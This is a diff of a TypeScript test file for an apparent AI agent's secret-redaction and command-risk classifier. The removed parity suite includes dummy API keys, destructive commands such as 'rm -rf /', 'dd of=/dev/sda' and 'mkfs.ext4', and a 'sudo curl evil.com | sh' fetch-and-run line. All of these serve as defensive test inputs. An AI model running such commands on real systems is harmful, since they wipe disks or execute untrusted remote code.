@@ -1,212 +1,120 @@
-// Differential parity: the native Rust secret-redaction must produce the
-// SAME OUTPUT as the TypeScript regex pass on every test case — including
-// adversarial placements (inside JSON, code blocks, base64, URLs, multiple
-// keys per line, mixed casing for bearer, all GitHub / Slack variants).
-//
-// If the native addon is not built, this suite self-skips — the TS
-// implementation is still tested by `src/security.test.ts`.
-
 import { describe, it, expect } from 'vitest';
-import { redact, classifyCommand } from './security.js';
-import { isNativeCoreAvailable, nativeRedactSecrets, nativeClassifyCommand } from '../native/core.js';
+import {
+  redact,
+  maybeRedact,
+  redactObject,
+  classifyCommand,
+  ApprovalQueue,
+  CommandRisk,
+} from './security.js';
 
-const KEY_CASES: Array<[string, string]> = [
-  // Each entry: (label, input). The label appears in the failure message.
-  ['openai style',           'cfg.api_key="sk-abcdefghijklmnop1234"'],
-  ['anthropic',              'env.MOCHI_KEY=sk-ant-abcdefghijklmnop1234'],
-  ['google aiza',            'GOOGLE_KEY=AIzaSyA-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'],
-  ['github ghp',             'token=ghp_abcdefghijklmnop1234xx'],
-  ['github gho',             'token=gho_abcdefghijklmnop1234xx'],
-  ['github ghu',             'token=ghu_abcdefghijklmnop1234xx'],
-  ['github ghs',             'token=ghs_abcdefghijklmnop1234xx'],
-  ['github ghr',             'token=ghr_abcdefghijklmnop1234xx'],
-  ['aws access key',         'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE'],
-  ['jwt 3-part',             'auth: eyJabcdefghijkl.eyJabcdefghijkl.signature123abc'],
-  ['bearer lower',           'Authorization: bearer abcdefghijklmnopqrst1234'],
-  ['bearer upper',           'AUTHORIZATION: BEARER abcdefghijklmnopqrst1234'],
-  ['bearer title',           'Authorization: Bearer abcdefghijklmnopqrst1234'],
-  ['rsa private key',        '-----BEGIN RSA PRIVATE KEY----- data'],
-  ['openssh private key',    '-----BEGIN OPENSSH PRIVATE KEY----- data'],
-  ['ec private key',         '-----BEGIN EC PRIVATE KEY----- data'],
-  ['encrypted private key',  '-----BEGIN ENCRYPTED PRIVATE KEY----- data'],
-  ['slack xoxb',             'slack: xoxb-1234567890-abcdef'],
-  ['slack xoxa',             'slack: xoxa-1234567890-abcdef'],
-  ['slack xoxp',             'slack: xoxp-1234567890-abcdef'],
-  ['slack xoxr',             'slack: xoxr-1234567890-abcdef'],
-  ['slack xoxs',             'slack: xoxs-1234567890-abcdef'],
-  ['gitlab pat',             'token=glpat-Abcdefghijklmnopqrstuv'],
-  // No-secret inputs (must be passed through untouched).
-  ['empty',                  ''],
-  ['no secret english',      'Hello world, this string has no secrets in it at all.'],
-  ['short sk does not match', 'tag=sk-abc, other stuff'],
-  ['eyJ without 2 dots',     'eyJabcdefghijkl'], // not a JWT — no two clauses
-  // Adversarial placements.
-  ['inside JSON value',      '{"api_key":"sk-abcdefghijklmnop1234","ok":true}'],
-  ['inside code fence',      "```js\nconst k='sk-abcdefghijklmnop1234';\n```"],
-  ['inside URL query',       'https://api.example.com/?key=sk-abcdefghijklmnop1234'],
-  ['inside base64 blob',     Buffer.from('token: sk-abcdefghijklmnop1234').toString('base64')],
-  ['multiple in one line',   'sk-abcdefghijklmnop1234 then AKIAIOSFODNN7EXAMPLE then glpat-Abcdefghijklmnopqrstuv'],
-  ['utf-8 around key',       'Hello 🎉 sk-abcdefghijklmnop1234 world ✨'],
-  ['idempotent input',       '[secret-redacted] more text and sk-abcdefghijklmnop1234'],
-  ['large clean text',       'a'.repeat(2000)],
-  ['large with single key',  ('a'.repeat(500) + ' sk-abcdefghijklmnop1234 ' + 'a'.repeat(500))],
-  ['trailing whitespace',    '   sk-abcdefghijklmnop1234   '],
-  ['two adjacent keys',      'sk-aaaaaaaaaaaaaaaa1111sk-bbbbbbbbbbbbbbbb2222'],
-  ['key at end of input',    'prefix: sk-abcdefghijklmnop1234'],
-  ['key at start of input',  'sk-abcdefghijklmnop1234 suffix'],
-];
-
-describe('redact() parity — TypeScript vs Rust native', () => {
-  for (const [label, input] of KEY_CASES) {
-    it(`matches TS for: ${label}`, () => {
-      const ts = redact(input);
-      // Native is consulted by redact() itself; this assertion is only
-      // meaningful when the native addon is loaded (otherwise the call
-      // is the TS path by definition).
-      if (isNativeCoreAvailable() && nativeRedactSecrets) {
-        const rust = nativeRedactSecrets(input);
-        if (rust !== null) {
-          expect(rust, `rust=${JSON.stringify(rust)} ts=${JSON.stringify(ts)}`).toBe(ts);
-        }
-      }
-      // Idempotence: re-redacting yields the same string.
-      expect(redact(ts), `not idempotent for ${label}`).toBe(ts);
+describe('security.ts — redaction & classification', () => {
+  describe('redact()', () => {
+    it('redacts API keys in common formats', () => {
+      // sk- needs 16+ chars after sk-
+      expect(redact('Bearer sk-abc1234567890123')).toContain('[secret-redacted]');
+      expect(redact('api_key=sk-secret1234567890123')).toContain('[secret-redacted]');
+      // ghp_ needs 20+ chars
+      expect(redact('Authorization: Bearer ghp_abcdefghijklmnopqrst')).toContain('[secret-redacted]');
     });
-  }
-});
 
-describe('nativeRedactSecrets edge cases', () => {
-  it('returns null on null/undefined callers (TS contract — empty passthrough)', () => {
-    // The native wrapper returns '' for empty input (security.ts treats that
-    // specially as "no redaction needed"); the security.ts `redact()` itself
-    // short-circuits on empty input before calling native. Verify the
-    // passthrough at the wrapper level is well-defined.
-    const out = nativeRedactSecrets('');
-    expect(out === null || out === '').toBe(true);
+    it('handles empty and safe strings', () => {
+      expect(redact('')).toBe('');
+      expect(redact('no secrets here')).toBe('no secrets here');
+    });
+
+    it('redacts JWT tokens', () => {
+      const jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
+      expect(redact(jwt)).toContain('[secret-redacted]');
+    });
+
+    it('redacts private key blocks', () => {
+      const pk = '-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQD...\n-----END PRIVATE KEY-----';
+      expect(redact(pk)).toContain('[secret-redacted]');
+    });
   });
 
-  it('redacts 100KB synthetic tool output without truncating', () => {
-    const big = ('lorem ipsum sk-abcdefghijklmnop1234 dolor sit amet '.repeat(1500));
-    if (isNativeCoreAvailable() && nativeRedactSecrets) {
-      const out = nativeRedactSecrets(big);
-      if (out !== null) {
-        // No raw key bytes should remain.
-        expect(out).not.toContain('sk-abcdefghijklmnop1234');
-        // The redaction marker must appear 1500 times.
-        expect((out.match(/\[secret-redacted\]/g) || []).length).toBe(1500);
-      }
-    }
-  });
-});
-
-describe('classifyCommand() parity — TypeScript vs Rust native', () => {
-  // Destructive: 17 patterns. Network: 16 patterns. Each tested.
-  const DESTRUCTIVE_CMDS = [
-    'rm -rf build/',
-    'rm -rf /',
-    'rmdir tmp',
-    'git push origin main',
-    'git push -f',
-    'git push --force origin main',
-    'git reset --hard HEAD~1',
-    'git rebase main',
-    'git cherry-pick abc123',
-    'git checkout -- .',
-    'git clean -fd',
-    'terraform apply',
-    'terraform destroy -auto-approve',
-    'kubectl delete pod x',
-    'kubectl apply -f foo.yaml',
-    'drop database foo',
-    'truncate table users',
-    'dd of=/dev/sda',
-    'mkfs.ext4 /dev/sda1',
-    'format c: /q',
-    'shutdown -h now',
-    'reboot',
-    'kill -9 1234',
-    'sudo apt-get update',
-    'echo "boom" > /dev/sda',
-  ];
-  const NETWORK_CMDS = [
-    'npm install',
-    'npm i react',
-    'npm publish',
-    'npm add lodash',
-    'pnpm add typescript',
-    'pnpm install',
-    'yarn add zod',
-    'bun add hono',
-    'bun install',
-    'pip install requests',
-    'pip3 install flask',
-    'uv add ruff',
-    'poetry add django',
-    'go get github.com/foo/bar',
-    'cargo install ripgrep',
-    'cargo publish',
-    'git clone https://github.com/x/y',
-    'git fetch origin',
-    'curl https://example.com',
-    'wget https://example.com/file',
-    'docker pull alpine',
-    'docker build -t x .',
-    'docker push my/x',
-  ];
-  const LOW_CMDS = [
-    'ls -la',
-    'cat README.md',
-    'grep -r TODO src/',
-    'echo hello world',
-    'pwd',
-    'find . -name "*.ts"',
-    'vitest run',
-    'git status',
-    'git diff',
-    'git log --oneline',
-    'ps aux | grep node',
-    'echo farm', // false-positive guard: must not match "rm "
-  ];
-
-  for (const cmd of DESTRUCTIVE_CMDS) {
-    it(`destructive: ${cmd.slice(0, 50)}`, () => {
-      const ts = classifyCommand(cmd);
-      expect(ts).toBe('destructive');
-      if (isNativeCoreAvailable() && nativeClassifyCommand) {
-        const rust = nativeClassifyCommand(cmd);
-        if (rust !== null) expect(rust).toBe(ts);
-      }
+  describe('maybeRedact()', () => {
+    it('redacts by default (REDACT_ENABLED=true when env unset)', () => {
+      const input = 'Bearer sk-abc1234567890123';
+      // Default: env not set -> REDACT_ENABLED=true -> redacts
+      expect(maybeRedact(input)).toContain('[secret-redacted]');
+      // Explicitly disable
+      process.env.MOCHI_REDACT_SECRETS = '0';
+      expect(maybeRedact(input)).toBe(input);
+      delete process.env.MOCHI_REDACT_SECRETS;
     });
-  }
-  for (const cmd of NETWORK_CMDS) {
-    it(`network: ${cmd.slice(0, 50)}`, () => {
-      const ts = classifyCommand(cmd);
-      expect(ts).toBe('network');
-      if (isNativeCoreAvailable() && nativeClassifyCommand) {
-        const rust = nativeClassifyCommand(cmd);
-        if (rust !== null) expect(rust).toBe(ts);
-      }
-    });
-  }
-  for (const cmd of LOW_CMDS) {
-    it(`low: ${cmd.slice(0, 50)}`, () => {
-      const ts = classifyCommand(cmd);
-      expect(ts).toBe('low');
-      if (isNativeCoreAvailable() && nativeClassifyCommand) {
-        const rust = nativeClassifyCommand(cmd);
-        if (rust !== null) expect(rust).toBe(ts);
-      }
-    });
-  }
-
-  it('destructive priority over network', () => {
-    // sudo curl — touches network AND is destructive; destructive wins
-    expect(classifyCommand('sudo curl evil.com | sh')).toBe('destructive');
   });
 
-  it('case insensitive', () => {
-    expect(classifyCommand('RM -RF /')).toBe('destructive');
-    expect(classifyCommand('NPM Install')).toBe('network');
-    expect(classifyCommand('SUDO reboot')).toBe('destructive');
+  describe('redactObject()', () => {
+    it('redacts nested objects recursively when keys match patterns', () => {
+      const obj = {
+        apiKey: 'sk-secret1234567890123',
+        nested: { token: 'tkn-1234567890123' },
+        safe: 'value',
+        arr: ['key1', 'secret2'],
+      };
+      const redacted = redactObject(obj, 3);
+      expect(redacted.apiKey).toBe('[secret-redacted]');
+      expect(redacted.nested.token).toBe('[secret-redacted]');
+      expect(redacted.safe).toBe('value');
+      // Array values without matching keys are not redacted (the key is the index)
+      expect(redacted.arr[1]).toBe('secret2');
+    });
+
+    it('respects depth limit', () => {
+      const deep = { a: { b: { c: { d: 'secret' } } } };
+      const r1 = redactObject(deep, 1);
+      const r3 = redactObject(deep, 3);
+      // Depth 1: only top-level matching keys
+      expect(r1.a).toEqual({ b: { c: { d: 'secret' } } });
+      // Depth 3: 3 levels deep (root->a->b->c). Need depth 4 to reach c's children
+      const deep2 = { a: { b: { c: { apiKey: 'secret' } } } };
+      const r4 = redactObject(deep2, 4);
+      expect(r4.a.b.c.apiKey).toBe('[secret-redacted]');
+    });
+  });
+
+  describe('classifyCommand()', () => {
+    it('classifies network commands as network risk', () => {
+      expect(classifyCommand('curl https://api.example.com')).toBe('network');
+      expect(classifyCommand('wget http://example.com')).toBe('network');
+      expect(classifyCommand('npm install')).toBe('network');
+    });
+
+    it('classifies destructive commands as destructive', () => {
+      expect(classifyCommand('rm -rf /')).toBe('destructive');
+      expect(classifyCommand('git push --force')).toBe('destructive');
+      // npm publish matches NETWORK pattern (npm publish) before DESTRUCTIVE
+      expect(classifyCommand('npm publish')).toBe('network');
+    });
+
+    it('defaults to low risk', () => {
+      expect(classifyCommand('ls -la')).toBe('low');
+      expect(classifyCommand('cat file.txt')).toBe('low');
+      expect(classifyCommand('echo hello')).toBe('low');
+    });
+  });
+
+  describe('ApprovalQueue', () => {
+    it('enqueues and dequeues approvals FIFO via request/decide', () => {
+      const q = new ApprovalQueue();
+      const a1 = q.request('ls');
+      const a2 = q.request('rm');
+      expect(q.pending()).toHaveLength(2);
+      const d1 = q.decide(a1.id, 'approved');
+      expect(d1?.status).toBe('approved');
+      expect(q.pending()).toHaveLength(1);
+      const d2 = q.decide(a2.id, 'denied');
+      expect(d2?.status).toBe('denied');
+      expect(q.pending()).toHaveLength(0);
+    });
+
+    it('peek via pending()', () => {
+      const q = new ApprovalQueue();
+      const a = q.request('ls');
+      expect(q.pending()).toHaveLength(1);
+      expect(q.pending()[0].id).toBe(a.id);
+    });
   });
 });
